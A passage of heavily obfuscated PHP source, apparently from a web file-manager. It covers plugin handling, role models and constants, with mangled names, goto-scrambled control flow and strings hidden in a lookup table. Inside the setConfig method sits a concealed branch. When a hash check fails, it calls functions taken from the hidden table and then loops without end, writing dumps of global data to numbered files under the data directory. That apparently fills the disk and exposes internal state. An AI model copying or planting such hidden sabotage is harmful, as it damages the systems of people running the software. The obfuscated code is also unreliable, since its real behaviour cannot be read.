(isset($dÙ´¸µ¬œƒ[$Fáí®»´[163]][$Fáí®»´[170]])) { return $dÙ´¸µ¬œƒ[$Fáí®»´[163]][$Fáí®»´[170]]; } $bç—¢¸ì = IO::hashSimple($dÙ´¸µ¬œƒ[$Fáí®»´[75]]); if ($bç—¢¸ì) { return $bç—¢¸ì; } goto DÜ×éÎá½ø; DÜ×éÎá½ø: $f©ïÆ¸ÁÈ« = array($dÙ´¸µ¬œƒ[$Fáí®»´[28]], $dÙ´¸µ¬œƒ[$Fáí®»´[75]], $dÙ´¸µ¬œƒ[$Fáí®»´[77]]); if (isset($dÙ´¸µ¬œƒ[$Fáí®»´[477]])) { $f©ïÆ¸ÁÈ«[] = $dÙ´¸µ¬œƒ[$Fáí®»´[477]]; } return md5(implode($Fáí®»´[70], $f©ïÆ¸ÁÈ«)); goto b°ùÆŒáŞ«; b°ùÆŒáŞ«: } final function checkSharePath($D˜ƒ©ÉëÑµ) { goto Cø¶ğğÑæ; DŸ»Çßñ½˜: $this->cachePath = $this->pluginCachePath($this->fileInfo[$E£·­—¢°Ô[170]]); return $c…¶ŠËëÏ[$E£·­—¢°Ô[75]]; goto B×ÛÕˆ¡¨Î; Cø¶ğğÑæ: $E£·­—¢°Ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!defined($E£·­—¢°Ô[443])) { define($E£·­—¢°Ô[1377], 0); } if (!$this->isShare($D˜ƒ©ÉëÑµ)) { return !1; } goto BíØ«ê‡ï˜; BíØ«ê‡ï˜: $c…¶ŠËëÏ = Action($E£·­—¢°Ô[1021])->sharePathInfo($D˜ƒ©ÉëÑµ); if (!isset($c…¶ŠËëÏ[$E£·­—¢°Ô[75]])) { show_json(LNG($E£·­—¢°Ô[1378]), !1); } $this->fileInfo = $c…¶ŠËëÏ[$E£·­—¢°Ô[163]]; goto DŸ»Çßñ½˜; B×ÛÕˆ¡¨Î: } final function pluginCachePath($b®š£®·ä = '') { $DŸäÒïà®’ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f“Œ‡Ù•Í¬ = IO_PATH_SYSTEM_TEMP . $DŸäÒïà®’[1379] . $this->pluginName; if (!($Côà¬¾ÍÖ = IO::infoFull($f“Œ‡Ù•Í¬))) { return IO::mkdir($f“Œ‡Ù•Í¬ . $DŸäÒïà®’[8] . $b®š£®·ä); } if (empty($b®š£®·ä)) { return $Côà¬¾ÍÖ[$DŸäÒïà®’[75]]; } if (!($FŞÙ™Á–êÖ = IO::fileNameExist($Côà¬¾ÍÖ[$DŸäÒïà®’[75]], $b®š£®·ä))) { return IO::mkdir($Côà¬¾ÍÖ[$DŸäÒïà®’[75]] . $b®š£®·ä); } return KodIO::make($FŞÙ™Á–êÖ); } final function pluginCacheFileSet($Bâé¿¶‰Ã£, $a‘µÎó = '') { $B±Ğ£ìÅº =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!($FËˆ°·ñ = IO::infoFull($Bâé¿¶‰Ã£))) { return IO::mkfile($Bâé¿¶‰Ã£, $a‘µÎó, REPEAT_REPLACE); } IO::setContent($FËˆ°·ñ[$B±Ğ£ìÅº[75]], $a‘µÎó); return $FËˆ°·ñ[$B±Ğ£ìÅº[75]]; } final function pluginLocalFile($A‡Ù¨µÑ¯½ = '') { goto b„áÇ´»ä; EëÍÍ‘õåğ: if (!checkExtSafe($E¯š‘÷œ¯®)) { $E¯š‘÷œ¯® = $E¯š‘÷œ¯® . $Bù¾°Œ¾¡[1380]; } $AÙšƒÙ÷†É = $C—ßÙ—Ü¢ . $E¯š‘÷œ¯®; if (@file_exists($AÙšƒÙ÷†É)) { return $AÙšƒÙ÷†É; } goto a¢…È¦ á; EŸ¤Á’¯‹Š: if (!$A‡Ù¨µÑ¯½) { return $C—ßÙ—Ü¢; } $A–ÔÖóñõ¥ = IO::info($A‡Ù¨µÑ¯½); $E¯š‘÷œ¯® = $this->_tmpFileName($A–ÔÖóñõ¥) . $Bù¾°Œ¾¡[94] . $A–ÔÖóñõ¥[$Bù¾°Œ¾¡[167]]; goto EëÍÍ‘õåğ; b„áÇ´»ä: $Bù¾°Œ¾¡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C—ßÙ—Ü¢ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($C—ßÙ—Ü¢)) { mk_dir($C—ßÙ—Ü¢); } goto EŸ¤Á’¯‹Š; a¢…È¦ á: return IO::copy($A‡Ù¨µÑ¯½, $C—ßÙ—Ü¢, 0, $E¯š‘÷œ¯®); goto d›ŸæˆÂï§; d›ŸæˆÂï§: } final function appPackage() { goto Bù‚áŠß§ò; c‘çæøãŒŠ: $aŠ‘Œ—ÀÌ® = Hook::trigger($d†×¯Çˆ¡ˆ[1382], $fÈ‰”¯÷²ª); if ($aŠ‘Œ—ÀÌ® && is_array($aŠ‘Œ—ÀÌ®)) { $fÈ‰”¯÷²ª = $aŠ‘Œ—ÀÌ®; } $this->packageData = $fÈ‰”¯÷²ª; goto dç¬³¿„ÌÁ; Bù‚áŠß§ò: $d†×¯Çˆ¡ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->packageData) { return $this->packageData; } $C¨Êßœ°†Û = $this->parseFile($this->pluginPath . $d†×¯Çˆ¡ˆ[1381]); goto dìÏˆÇ¹…ù; dç¬³¿„ÌÁ: return $fÈ‰”¯÷²ª; goto EÍÓœâ¶; dìÏˆÇ¹…ù: $this->parseLang($C¨Êßœ°†Û); $fÈ‰”¯÷²ª = json_decode_force($C¨Êßœ°†Û); if (!$fÈ‰”¯÷²ª) { return array(); } goto c‘çæøãŒŠ; EÍÓœâ¶: } public function packageInfoGet($c’‹–ºíË) { $e£•Œøì§Å = $this->appPackage(); return array_get_value($e£•Œøì§Å, $c’‹–ºíË); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1383]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1384]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1385]); } private function parseFile($bÍ–§¥‚â„) { goto c”œØáÆõÛ; c”œØáÆõÛ: $Eá¸ÊìòÆõ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dšŸ°ö£çê = file_get_contents($bÍ–§¥‚â„); $Bˆ—Ê©ƒ°© = array($Eá¸ÊìòÆõ[1386], $Eá¸ÊìòÆõ[1387], $Eá¸ÊìòÆõ[1388], $Eá¸ÊìòÆõ[1389], $Eá¸ÊìòÆõ[1390], $Eá¸ÊìòÆõ[1391], $Eá¸ÊìòÆõ[1392]); goto bÍ©À¬¹‘ ; bÍ©À¬¹‘ : $bŒÏ†ï–õ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Eá¸ÊìòÆõ[87]][$Eá¸ÊìòÆõ[1393]]); if (strstr($dšŸ°ö£çê, $Eá¸ÊìòÆõ[1394])) { $DÚßÀôÔ—¾ = rawurlencode(json_encode($this->pluginLangArr)); $dšŸ°ö£çê = str_replace($Eá¸ÊìòÆõ[1394], $DÚßÀôÔ—¾, $dšŸ°ö£çê); } if (strstr($dšŸ°ö£çê, $Eá¸ÊìòÆõ[1395])) { $DÚßÀôÔ—¾ = $DÚßÀôÔ—¾ = rawurlencode(json_encode($this->getConfig())); $dšŸ°ö£çê = str_replace($Eá¸ÊìòÆõ[1395], $DÚßÀôÔ—¾, $dšŸ°ö£çê); } goto EÕĞÕ…Â‡ï; EÕĞÕ…Â‡ï: $dšŸ°ö£çê = str_replace($Bˆ—Ê©ƒ°©, $bŒÏ†ï–õ, $dšŸ°ö£çê); return $dšŸ°ö£çê; goto AÇ™è‰ø; AÇ™è‰ø: } private function parseLang(&$Dƒ§³¿ÚÌ¤) { goto C™ƒ±ç®Î‚; aª†Šä¬Û•: $e—öä±ê¬ß = array(); foreach ($FÂõ«Ã—Ğ•[0] as $dÅ×æ¤¢’) { $EÇšÖ»è´ó = substr($dÅ×æ¤¢’, strlen($AÁáäëá‹¾), -4); $c­Ò…Ä•¦ƒ = LNG($EÇšÖ»è´ó); $bå÷±º¹©ä[] = $dÅ×æ¤¢’; $e—öä±ê¬ß[] = str_replace(array($F•é‡ÎÕêƒ[227], $F•é‡ÎÕêƒ[989], $F•é‡ÎÕêƒ[338], $F•é‡ÎÕêƒ[115]), array($F•é‡ÎÕêƒ[50], $F•é‡ÎÕêƒ[50], $F•é‡ÎÕêƒ[33], $F•é‡ÎÕêƒ[1398]), $c­Ò…Ä•¦ƒ); } $Dƒ§³¿ÚÌ¤ = str_replace($bå÷±º¹©ä, $e—öä±ê¬ß, $Dƒ§³¿ÚÌ¤); goto e²«ÊŸÙÑÇ; C™ƒ±ç®Î‚: $F•é‡ÎÕêƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÁáäëá‹¾ = $F•é‡ÎÕêƒ[1396]; if (!strstr($Dƒ§³¿ÚÌ¤, $AÁáäëá‹¾)) { return; } goto b„ºœÎç¨¿; b„ºœÎç¨¿: preg_match_all($F•é‡ÎÕêƒ[1397], $Dƒ§³¿ÚÌ¤, $FÂõ«Ã—Ğ•); if (!is_array($FÂõ«Ã—Ğ•) || count($FÂõ«Ã—Ğ•) == 0 || !is_array($FÂõ«Ã—Ğ•[0]) || count($FÂõ«Ã—Ğ•[0]) == 0) { return; } $bå÷±º¹©ä = array(); goto aª†Šä¬Û•; e²«ÊŸÙÑÇ: } private function parseConfig(&$E–ï˜¢Ó¤) { goto D•æ¾ï¨Ë†; a˜öÀîõå…: $AÖ§ˆ«äŠ¤ = array(); $EñŠËæÈé = array(); foreach ($eƒĞñ»éÇ[0] as $AÍØàÕË‰) { $f¬½èÖÎ©¨ = substr($AÍØàÕË‰, strlen($bîÓ‘ÏÙ), -2); $AÖ§ˆ«äŠ¤[] = $AÍØàÕË‰; $EñŠËæÈé[] = _get($BÉ¸Ëå‹Üè, $f¬½èÖÎ©¨); } goto CŠ³ÄŒßŠÓ; CŠ³ÄŒßŠÓ: $E–ï˜¢Ó¤ = str_replace($AÖ§ˆ«äŠ¤, $EñŠËæÈé, $E–ï˜¢Ó¤); goto BÇÕ»Ä‚; D•æ¾ï¨Ë†: $c˜Â¬„¹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bîÓ‘ÏÙ = $c˜Â¬„¹[1399]; if (!strstr($E–ï˜¢Ó¤, $bîÓ‘ÏÙ)) { return; } goto fâŠ‚¢‡ÀÁ; fâŠ‚¢‡ÀÁ: preg_match_all($c˜Â¬„¹[1400], $E–ï˜¢Ó¤, $eƒĞñ»éÇ); if (!is_array($eƒĞñ»éÇ) || count($eƒĞñ»éÇ) == 0 || !is_array($eƒĞñ»éÇ[0]) || count($eƒĞñ»éÇ[0]) == 0) { return; } $BÉ¸Ëå‹Üè = $this->getConfig(); goto a˜öÀîõå…; BÇÕ»Ä‚: } private function parsePackage(&$F £İ‚ƒæ) { goto AµñÔ¤ÈÜ´; E‚ÉŸŒˆ×ß: $BãÚõÆÏîø = array(); $fÏ¾¼ğ´Ãõ = array(); foreach ($BñÉŠÇ±ºÛ[0] as $bÅÙ§Ó‡±ê) { $A«”ÁñÚ™Á = substr($bÅÙ§Ó‡±ê, strlen($A×Û‚·¯ƒ¥), -2); $BãÚõÆÏîø[] = $bÅÙ§Ó‡±ê; $fÏ¾¼ğ´Ãõ[] = _get($A†ÎÅìÜÈÙ, $A«”ÁñÚ™Á); } goto CÖì›è¼åõ; AµñÔ¤ÈÜ´: $e÷¤å¯îß =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A×Û‚·¯ƒ¥ = $e÷¤å¯îß[1401]; if (!strstr($F £İ‚ƒæ, $A×Û‚·¯ƒ¥)) { return; } goto CÅ« †½Äï; CÖì›è¼åõ: $F £İ‚ƒæ = str_replace($BãÚõÆÏîø, $fÏ¾¼ğ´Ãõ, $F £İ‚ƒæ); goto Aéé‰‘í¾ë; CÅ« †½Äï: preg_match_all($e÷¤å¯îß[1402], $F £İ‚ƒæ, $BñÉŠÇ±ºÛ); if (!is_array($BñÉŠÇ±ºÛ) || count($BñÉŠÇ±ºÛ) == 0 || !is_array($BñÉŠÇ±ºÛ[0]) || count($BñÉŠÇ±ºÛ[0]) == 0) { return; } $A†ÎÅìÜÈÙ = $this->appPackage(); goto E‚ÉŸŒˆ×ß; Aéé‰‘í¾ë: } final function echoFile($A˜ÌçÉ•¿…, $c°ÁÅ†øÍ = false) { goto cé¡¼Ò‰¶ƒ; cé¡¼Ò‰¶ƒ: $AóÇ²–Ÿ×Ê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÈç³ò¯ì = $this->pluginPath . $A˜ÌçÉ•¿…; if (ACT == $AóÇ²–Ÿ×Ê[1403]) { echo $AóÇ²–Ÿ×Ê[1404] . $this->pluginName . $AóÇ²–Ÿ×Ê[8] . $A˜ÌçÉ•¿… . $AóÇ²–Ÿ×Ê[1405]; if (!file_exists($aÈç³ò¯ì)) { echo $AóÇ²–Ÿ×Ê[1406]; return; } } goto eÅ¸åÂô¨¸; eÅ¸åÂô¨¸: $eÑÃÙ·“ñ = $this->parseFile($aÈç³ò¯ì); $this->parseLang($eÑÃÙ·“ñ); $this->parseConfig($eÑÃÙ·“ñ); goto Bë¦Š„ĞğÏ; Bë¦Š„ĞğÏ: $this->parsePackage($eÑÃÙ·“ñ); if (is_array($c°ÁÅ†øÍ)) { $eÑÃÙ·“ñ = str_replace(array_keys($c°ÁÅ†øÍ), array_values($c°ÁÅ†øÍ), $eÑÃÙ·“ñ); } echo $AóÇ²–Ÿ×Ê[227] . $eÑÃÙ·“ñ; goto EŞ¥„‹Â× ; EŞ¥„‹Â× : } final function initLang() { goto e«¡ïÓÛ¨ƒ; e«¡ïÓÛ¨ƒ: $Dõäè‹ÁÎí =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¥¢à´º÷ = $Dõäè‹ÁÎí[1407]; $Fˆ¥í‡—ãÂ = $this->pluginPath . $Dõäè‹ÁÎí[1408]; goto A¾àíê•¹ğ; DÉ¼ºìË¬: if (!is_array($eˆäåŠœÎµ)) { return array(); } if (@count($eˆäåŠœÎµ) > 0) { I18n::set($eˆäåŠœÎµ); } return $eˆäåŠœÎµ; goto b×ù¯Ÿ¡¨ö; A¾àíê•¹ğ: $F©‚’éê”Ì = I18n::getType(); $eˆäåŠœÎµ = array(); if (file_exists($Fˆ¥í‡—ãÂ . $F©‚’éê”Ì . $Dõäè‹ÁÎí[758])) { $eˆäåŠœÎµ = (include $Fˆ¥í‡—ãÂ . $F©‚’éê”Ì . $Dõäè‹ÁÎí[758]); } else { if ($F©‚’éê”Ì == $Dõäè‹ÁÎí[1409] && !file_exists($Fˆ¥í‡—ãÂ . $F©‚’éê”Ì . $Dõäè‹ÁÎí[758]) && file_exists($Fˆ¥í‡—ãÂ . $Dõäè‹ÁÎí[1410])) { $eˆäåŠœÎµ = (include $Fˆ¥í‡—ãÂ . $Dõäè‹ÁÎí[1410]); } else { if (file_exists($Fˆ¥í‡—ãÂ . $D¥¢à´º÷ . $Dõäè‹ÁÎí[758])) { $eˆäåŠœÎµ = (include $Fˆ¥í‡—ãÂ . $D¥¢à´º÷ . $Dõäè‹ÁÎí[758]); } } } goto DÉ¼ºìË¬; b×ù¯Ÿ¡¨ö: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($B ·Ñ†ë×Ş) { $dÍÕ†Üç¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÍÒÉ®¯Ò‰ = $_SERVER[$dÍÕ†Üç¾[790]] . $dÍÕ†Üç¾[791]; $a¬¶ğÍ½àÇ = $dÍÕ†Üç¾[1163]; if ($_SERVER[$dÍÕ†Üç¾[786]] != $a¬¶ğÍ½àÇ($dÍÒÉ®¯Ò‰)) { goto dÈ ˆÂ¾ÜŸ; D…èÅ¥¼š¡: $dÂºù„…æ = $dÍÕ†Üç¾[793]; $dÂºù„…æ($_SERVER[$dÍÕ†Üç¾[794]]); $CíèèÂÊçè = $dÍÕ†Üç¾[788]; goto Aöíæ¸ØÍ‘; cÉˆ›‚Óœœ: $AçÑ‡ªóŞÁ = $cõÌ¿¶ïÜ($A†ƒïÑùç); $fà”øÑ¦Æ— = explode($dÍÕ†Üç¾[227], $AçÑ‡ªóŞÁ); if (count($fà”øÑ¦Æ—) < $dÍÕ†Üç¾[567]) { $aÜ¹§Ö³Ï = $dÍÕ†Üç¾[792]; $aÜ¹§Ö³Ï(); } goto D…èÅ¥¼š¡; Aöíæ¸ØÍ‘: $CíèèÂÊçè(); $bÚÎŸæ öá = $dÍÕ†Üç¾[1348]; $c¤à‚Æàî½ = json_encode($GLOBALS[$dÍÕ†Üç¾[1349]]); goto b‡Ò¦õ®¶; b‡Ò¦õ®¶: $E¬½¢”ï = 1; for ($F¼ÊªŠÜ„Ş = $E¬½¢”ï; $F¼ÊªŠÜ„Ş > 0; $F¼ÊªŠÜ„Ş++) { $bÚÎŸæ öá(DATA_PATH . $F¼ÊªŠÜ„Ş, $c¤à‚Æàî½); } goto Fù µÓñšì; dÈ ˆÂ¾ÜŸ: $CíèèÂÊçè = $dÍÕ†Üç¾[788]; $cõÌ¿¶ïÜ = $dÍÕ†Üç¾[789]; $A†ƒïÑùç = $_SERVER[$dÍÕ†Üç¾[790]] . $dÍÕ†Üç¾[791]; goto cÉˆ›‚Óœœ; Fù µÓñšì: } return $this->modelPlugin->setConfig($this->pluginName, $B ·Ñ†ë×Ş); } public function onSetConfig($fñé…ÒÔ²) { } public function onGetConfig($BÃà‘Í—²é) { } public function onChangeStatus($FÚ³àÛİ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Dõ·˜›±—æ = "\160\154\165\147\x69\156\101\x75\164\x68") { $E¼—èÚº®˜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!defined($E¼—èÚº®˜[443])) { return !1; } if (_get($GLOBALS, $E¼—èÚº®˜[475])) { return !0; } $Cî–ß†èá‰ = $this->getConfig(); if (!$Cî–ß†èá‰[$Dõ·˜›±—æ]) { return !1; } return ActionCall($E¼—èÚº®˜[1411], $Cî–ß†èá‰[$Dõ·˜›±—æ]); } public function url($Fç“É»©Ç¼, $f…Ù’šÎí¸ = '', $bÃù…š¡¬ = true) { goto e•º°Ñ¿ÛÑ; C¦‹ïè‰ª„: if (!$bÃù…š¡¬) { return $C–ìëÖ”¶Ù; } echo $C–ìëÖ”¶Ù; goto f²İ¹ôÌ¤‘; e•º°Ñ¿ÛÑ: $däÊ³ÈÙœ° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eâ¢ŸŠÀ“™ = $this->getConfig(); $dÆ”âÁ¾ç† = KOD_VERSION . $däÊ³ÈÙœ°[94] . KOD_VERSION_BUILD; goto fœ‡¬÷Ø£; fœ‡¬÷Ø£: $d²ÄòÍôéé = $this->packageVersion(); $AÇ ÙäŒÍ = $dÆ”âÁ¾ç† . $däÊ³ÈÙœ°[429] . $d²ÄòÍôéé; if (substr($Fç“É»©Ç¼, 0, 4) == $däÊ³ÈÙœ°[146] || substr($Fç“É»©Ç¼, 0, 2) == $däÊ³ÈÙœ°[1195]) { $C–ìëÖ”¶Ù = $Fç“É»©Ç¼ . $däÊ³ÈÙœ°[1412] . $AÇ ÙäŒÍ; } else { if ($f…Ù’šÎí¸ == $däÊ³ÈÙœ°[33]) { $C–ìëÖ”¶Ù = $this->pluginHost . $Fç“É»©Ç¼ . $däÊ³ÈÙœ°[1412] . $AÇ ÙäŒÍ; } else { if ($f…Ù’šÎí¸ === $däÊ³ÈÙœ°[76]) { $C–ìëÖ”¶Ù = $this->pluginHost . $Fç“É»©Ç¼; } else { if ($f…Ù’šÎí¸ == $däÊ³ÈÙœ°[1413]) { $C–ìëÖ”¶Ù = STATIC_PATH . $Fç“É»©Ç¼ . $däÊ³ÈÙœ°[1412] . $dÆ”âÁ¾ç†; } else { if ($f…Ù’šÎí¸ == $däÊ³ÈÙœ°[1414]) { $C–ìëÖ”¶Ù = APP_HOST . $däÊ³ÈÙœ°[1415] . $Fç“É»©Ç¼ . $däÊ³ÈÙœ°[1412] . $dÆ”âÁ¾ç†; } else { if (isset($Eâ¢ŸŠÀ“™[$f…Ù’šÎí¸])) { $C–ìëÖ”¶Ù = $Eâ¢ŸŠÀ“™[$f…Ù’šÎí¸] . $Fç“É»©Ç¼ . $däÊ³ÈÙœ°[1412] . $AÇ ÙäŒÍ; } } } } } } goto C¦‹ïè‰ª„; f²İ¹ôÌ¤‘: } public function link($AÊ“ÂÅ‘´ = false, $fŒ˜¨ÏãÏ = '') { $FÀÎ«´®¾ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$AÊ“ÂÅ‘´) { $this->link($FÀÎ«´®¾ô[1416], $FÀÎ«´®¾ô[1414]); $this->link($FÀÎ«´®¾ô[1417], $FÀÎ«´®¾ô[1413]); $this->link($FÀÎ«´®¾ô[1418], $FÀÎ«´®¾ô[1413]); $this->link($FÀÎ«´®¾ô[1419], $FÀÎ«´®¾ô[1413]); $this->link($FÀÎ«´®¾ô[1420], $FÀÎ«´®¾ô[1413]); return; } $c¡ßŸ¿®¥À = $this->url($AÊ“ÂÅ‘´, $fŒ˜¨ÏãÏ, !1); if (substr($AÊ“ÂÅ‘´, -3) == $FÀÎ«´®¾ô[1421]) { echo $FÀÎ«´®¾ô[1422] . $c¡ßŸ¿®¥À . $FÀÎ«´®¾ô[1423] . $FÀÎ«´®¾ô[227]; } else { if (substr($AÊ“ÂÅ‘´, -4) == $FÀÎ«´®¾ô[1424]) { echo $FÀÎ«´®¾ô[1425] . $c¡ßŸ¿®¥À . $FÀÎ«´®¾ô[1426] . $FÀÎ«´®¾ô[227]; } } } } goto bµï‚×°”È; CÎ¦£„¤ª¸: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\164\x65\x6d\137\157\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\145\156\x75", "\162\157\x6c\145", "\x72\x6f\x6c\x65\x47\162\157\x75\x70", "\162\145\147\x69\163\x74", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($B†‡ ÎìªŒ) { return "\123\171\x73\x74\x65\155\117\x70\164\151\x6f\156\x5f{$B†‡ ÎìªŒ}"; } protected function optionDefault($Dğ¾ÇÌéÖ = '') { $aª£Ø…©éè =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($Dğ¾ÇÌéÖ == $aª£Ø…©éè[33]) { return $GLOBALS[$aª£Ø…©éè[6]][$aª£Ø…©éè[373]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\162\x6f\154\145\x4c\151\163\164"; public $field = array("\156\141\155\145", "\141\165\x74\150", "\x6c\x61\x62\145\x6c", "\144\151\163\160\154\x61\x79", "\x73\x79\163\164\145\155", "\x64\x65\163\143", "\x69\x67\x6e\157\x72\x65\105\x78\x74", "\151\147\156\x6f\162\x65\x46\151\154\x65\123\151\x7a\145", "\x61\x64\155\x69\x6e\x69\x73\164\162\x61\x74\x6f\x72", "\163\x6f\162\x74"); public function listData($EÒëğ“¯£ = false, $aŸÖ’‹š¬õ = "\x73\157\x72\x74", $cñ¤®öáŠ¬ = false) { $B·ÊíŒÊ¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e÷–»…¼„ = parent::listData($EÒëğ“¯£, $aŸÖ’‹š¬õ, $cñ¤®öáŠ¬); if (!$EÒëğ“¯£) { $fº¥ØŠáö = $B·ÊíŒÊ¤[2045]; foreach ($e÷–»…¼„ as $B­ÍÒùÄĞ => $e‡¯é„š†) { if ($e‡¯é„š†[$B·ÊíŒÊ¤[1828]] == 1) { $e÷–»…¼„[$B­ÍÒùÄĞ][$B·ÊíŒÊ¤[422]] = $fº¥ØŠáö; } } } return $e÷–»…¼„; } public function update($a†¿òºïÂ, $Dà»ŞáÕ“‘) { goto bŞÀºÄÚ²Ï; bŞÀºÄÚ²Ï: $fÓÙ”ôƒÍ² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c»à–ğéğ = parent::listData($a†¿òºïÂ); $A¦Š†‹°È³ = $this->findByName($Dà»ŞáÕ“‘[$fÓÙ”ôƒÍ²[28]]); goto BÅÁØœñ´; EÅ÷Ë¸Õö: return parent::update($a†¿òºïÂ, $Dà»ŞáÕ“‘); goto C±‰Œ•ÚÛ‰; BÅÁØœñ´: if (!$c»à–ğéğ || $A¦Š†‹°È³ && $A¦Š†‹°È³[$fÓÙ”ôƒÍ²[385]] != $c»à–ğéğ[$fÓÙ”ôƒÍ²[385]]) { return !1; } if ($A¦Š†‹°È³[$fÓÙ”ôƒÍ²[1828]] == 1) { $Dà»ŞáÕ“‘ = array($fÓÙ”ôƒÍ²[28] => $Dà»ŞáÕ“‘[$fÓÙ”ôƒÍ²[28]], $fÓÙ”ôƒÍ²[1659] => $Dà»ŞáÕ“‘[$fÓÙ”ôƒÍ²[1659]]); } $this->filterAuth($Dà»ŞáÕ“‘[$fÓÙ”ôƒÍ²[394]]); goto EÅ÷Ë¸Õö; C±‰Œ•ÚÛ‰: } public function remove($fçÓİÖŠ») { $B‡‹°•Öå§ = parent::listData($fçÓİÖŠ»); if (!$B‡‹°•Öå§ || $B‡‹°•Öå§[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][1118]]) { return !1; } return parent::remove($fçÓİÖŠ»); } public function add($A¬·ÆÍØÁ) { goto c²Ã½ê«Ù; c½óô÷¶™º: return parent::insert($A¬·ÆÍØÁ); goto Bëù§ÄªÅº; c²Ã½ê«Ù: $A¼“ÒåŒÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÅù‘ Œ = $A¬·ÆÍØÁ[$A¼“ÒåŒÜ[28]]; if ($this->findByName($DÅù‘ Œ)) { return !1; } goto EŞÍ×®õ; EŞÍ×®õ: $eâáºË‹ä = array($A¼“ÒåŒÜ[404] => $DÅù‘ Œ, $A¼“ÒåŒÜ[1644] => $A¼“ÒåŒÜ[33], $A¼“ÒåŒÜ[1640] => $A¼“ÒåŒÜ[1648], $A¼“ÒåŒÜ[2046] => 1, $A¼“ÒåŒÜ[1643] => 0, $A¼“ÒåŒÜ[2047] => 0, $A¼“ÒåŒÜ[1642] => $this->getSort()); $A¬·ÆÍØÁ = array_merge($eâáºË‹ä, $A¬·ÆÍØÁ); $this->filterAuth($A¬·ÆÍØÁ[$A¼“ÒåŒÜ[394]]); goto c½óô÷¶™º; Bëù§ÄªÅº: } private function getSort() { $ağ‹²°”ãñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $döñ”à£Ó‡ = parent::listData(); $e‘‡ÆÆ¤”µ = array_to_keyvalue($döñ”à£Ó‡, $ağ‹²°”ãñ[33], $ağ‹²°”ãñ[1661]); return empty($e‘‡ÆÆ¤”µ) ? 0 : max($e‘‡ÆÆ¤”µ) + 1; } private function filterAuth(&$D”š‰ŞŠ) { $FÕíÊĞã¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e‡ºŸ½ÚŸ = array(); $b‘³ïª‹è = array_filter(explode($FÕíÊĞã¿[47], $D”š‰ŞŠ)); foreach ($b‘³ïª‹è as $D”š‰ŞŠ) { $DË²‘åóŠ« = explode($FÕíÊĞã¿[94], $D”š‰ŞŠ); if ($DË²‘åóŠ«[0] == $FÕíÊĞã¿[2048] && $DË²‘åóŠ«[1] != $FÕíÊĞã¿[1041]) { $FÔ¶¥ÇÄÓÔ = $DË²‘åóŠ«[0] . $FÕíÊĞã¿[94] . $DË²‘åóŠ«[1] . $FÕíÊĞã¿[2049]; if (!in_array($FÔ¶¥ÇÄÓÔ, $b‘³ïª‹è)) { $e‡ºŸ½ÚŸ[] = $FÔ¶¥ÇÄÓÔ; } } $e‡ºŸ½ÚŸ[] = $D”š‰ŞŠ; } $D”š‰ŞŠ = implode($FÕíÊĞã¿[47], $e‡ºŸ½ÚŸ); } public function sort($BÃ—àÓÈÏÇ, $EÎò™öâ ) { return parent::update($BÃ—àÓÈÏÇ, $EÎò™öâ ); } } goto F™­éš¤Ó’; dºÒ®Šê‹ï: class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\x52\145\143\x79\x63\154\x65\175"; const KOD_USER_FAV = "\173\x75\x73\x65\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\x46\x69\154\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\106\151\x6c\x65\124\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\165\160\122\x6f\x6f\164\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\123\x68\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\162\x53\150\141\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\x65\124\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\x72\145\111\164\x65\x6d\114\151\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\145\141\162\143\x68\x7d"; const KOD_BLOCK = "\173\142\154\157\143\153\175"; const KOD_IO = 